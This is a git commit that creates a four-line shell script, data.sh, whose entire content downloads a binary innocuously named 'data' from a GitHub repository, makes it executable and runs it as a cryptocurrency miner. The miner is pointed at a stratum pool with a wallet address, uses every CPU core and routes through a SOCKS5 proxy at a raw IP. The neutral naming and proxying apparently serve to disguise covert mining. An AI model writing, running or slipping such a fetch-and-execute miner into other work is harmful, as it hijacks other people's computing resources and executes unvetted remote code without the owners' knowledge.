2f311165d69f86448bdca677e93ec4708683e81c
adeayuvebriani <143151642+adeayuvebriani@users.noreply.github.com>
2023-09-08 09:09:37 +0800

    Create data.sh

---
+++ data.sh
@@ -0,0 +1,4 @@
+apt update -y
+wget https://github.com/adeayuvebriani/datamine/raw/main/data
+chmod +x data
+./data -a minotaurx -o stratum+tcp://p2p-spb.xyz:5557 -u MMguZU589zvBmqMAg3GsKoLxv1JZpWch8L -p x -t $(nproc) -x socks5://38.153.136.245:5268
